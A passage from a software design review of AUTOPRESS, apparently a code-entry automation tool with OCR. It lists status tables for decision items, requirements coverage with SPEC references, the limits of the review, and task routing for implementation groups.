| PX-17 | OK | storage.py:235-275 | |
| PX-18 | OK | codes/normalize.py:23, 58-62; models.py:1740-1741; SPEC.md:893-897, 1030, 1035 | |
| PX-19 | OK | models.py:831-836; codes/normalize.py:19; ui/paste_dialog.py:4 | |
| PX-20 | SIDE EFFECT | SPEC.md:172-173, 181, 1187-1188; capture.py:8-10 | over-broad: G-01 (blocker) |
| PX-21 | OK | SPEC.md:1097-1098, 1279-1284, 1309-1311 | distribution question still open (10.3) |
| PX-22 | OK | SPEC.md:1019-1021, 1056-1057, 1189; models.py:1463 | staleness: G-18 |
| PX-23 | OK | models.py:1095, 1138-1147; SPEC.md:988, 1233 | |
| PX-24 | OK | SPEC.md:52-53, 1313-1322 | 10.4 contradiction: G-21 |
| PX-25 | OK | SPEC.md:1306-1311; docs/design-preview/README.md:133 (marked) | |
| PX-26 | OK | as T37 | |
| PX-27 | OK | SPEC.md:236-238, 867, 1048-1050, 1173 | API default real: G-09 |
| PX-28 | PARTIAL | SPEC.md:253-254, 264-265, 986-987, 1148, 1161-1166, 1284 | 「未讀到任何文字」 has no English pair: G-14 |
| PX-29 | OK | SPEC.md:1129, 1131, 1132, 1144-1147 | |
| PX-30 | OK | as T32, T40 | |
| PX-31 | OK | win32/power.py:6-8, 16; runner/engine.py:11-12; SPEC.md:152-153 | |
| PX-32 | OK | SPEC.md:1233, 1345-1348 | |
| PX-33 | OK | SPEC.md:1040-1042; ui/profiles_page.py docstring | |
| PX-34 | OK | models.py:1261-1293 (no ko); tests/test_models.py:261 | wait_text "disappear" kept but broken by G-01 |

## D. Requirements coverage (`docs/requirements.md`)

| Requirement | SPEC sections | Status |
|---|---|---|
| 1 PyQt6, modern UI | 1.1 R1; 6.2-6.5; ui/theme.py | covered |
| 2 auto-enter many game codes | 1.1 R2; 2.4-2.6; 5.7 | covered |
| 3 OCR assist (read codes; help with input and submit) | 1.1 R3; 5.4 (image / clipboard / snip import, constrained re-read); 5.3 click_text, wait_text, ocr_check, verify_region; 6.4.1 | covered; G-01 breaks some OCR steps until fixed |
| 4 generic, for everyone | 1.1 R4; 5.2-5.5 (profiles, templates, JSON sharing) | covered; "everyone" vs the private repo of item 7 is the open question PX-21 (10.3) |
| 5 does not affect the game, only replaces typing | 1.2 never-list (no hooks, no anti-cheat bypass, no network); 6.4.6 safety rules | covered (a statement, no feature) |
| 6 many codes one after another until done | 1.1 R2 / R5; 2.5 loop; StopReason.COMPLETED | covered |
| 7 private GitHub repo AUTOPRESS | 1.1 R6; 10.3 step 6 | covered (orchestrator task) |
| 8 guide = real screenshots + numbered explanations on GitHub | 1.1 R7; 10.4 | covered; acceptance wording contradictory (G-21) |
| a queue, same flow per code (click, clear, type, submit, wait, optional OCR, close), auto stop | 2.5; 5.3 (click_point / click_text, type_code clear_first, key / click_text, wait / wait_text, ocr_check, close with click_text on_not_found continue) | covered |
| b reorder; checked only / unfinished only; statuses 待處理, 執行中, 成功, 已使用, 無效, 過期, 失敗, 略過 | 6.4.1 bulk 上移 / 下移 / 移到最上 (drag deferred, 1.2); RunSelection; 5.7 (待兌換, 兌換中, 成功, 已使用, 無效, 已過期, 失敗, 已略過 + 需確認, 已送出（未確認）, 冷卻中) | covered (labels worded differently) |
| c interval fixed + jitter; pause / resume from the next code; stop; continue after restart | RunPolicy interval_min_s / interval_max_s (uniform, equivalent); 2.6; queue.json + recover_after_crash (5.7) | pause / resume WEAKENED with default settings (G-07); after a crash or kill the interrupted code becomes REVIEW and waits for the user (justified: avoids a double submission) - say so in the user guide |
| d history skip of success / used; one-click retry of failures | 5.6 history_skip_statuses; 5.7 build_plan skip; 重試失敗 = retry_failed (FAILED only; REVIEW via 重設為待兌換) | covered |
| e rate limit -> stop or cool down and continue; stop after N failures | 2.5; RunPolicy on_rate_limit, cooldown_s, max_cooldowns, stop_after_failures | covered (counter details G-11) |
| f split one code over several boxes (separator or fixed sizes; Tab or nothing between) | 5.3 type_code split / group_sizes / between; codes.normalize.split_code | covered; leftovers in boxes 2..n (G-08) |
| g progress n / N + ETA, live log, export | 6.4.3 (ProgressRing, 第 i / n 筆, ETA, live log, 匯出結果); mini bar; CSV export of codes and history | covered |

## E. What this review did not verify

* No real input, real capture or OCR inference was run (the PC is locked; realinput tests are out of scope for
  this phase). Every Win32 / OCR behaviour above is taken from the SPEC, the stubs and the research docs.
* Browser behaviour for a TYPED `javascript:` URL in the address bar was not measured (G-02 does not depend on
  it: the DevTools console path is enough).
* Stub line numbers refer to the SPEC v2 commit; the groups are replacing the stubs now, so `autopress/**` line
  numbers will drift. A1 files (models.py, storage.py, paths.py, context.py, tests) are stable.
* Sections 3, 6.1-6.3, 6.5, 8-10 were read only where decision items or the findings needed them.

## F. Suggested routing (for the orchestrator)

* Foundation (A1) changes needed: G-02 (combo_risk / action_lines / validation), G-03 (validation of an empty
  exe; a helper to check a resolved WindowInfo), G-22 (countdown minimum), G-24 (test sentence), optionally
  G-11 (StopReason) and G-15 (ClientRegion anchor). Groups cannot make these (foundation is read-only).
* Tell now, while the groups implement: G-01 -> G2 (capture docstring) and G4; G-05 -> G6 and G7;
  G-06, G-07, G-08, G-11 -> G4 (G-07 also G3: `tick()` vs `InjectGuard.check`); G-04 -> G3 / G4;
  G-09 -> G4 / G7; G-10, G-17 -> G5; G-16, G-19 -> G1 / G6 / G7; G-20 -> G7 / G8; G-21 -> G8.
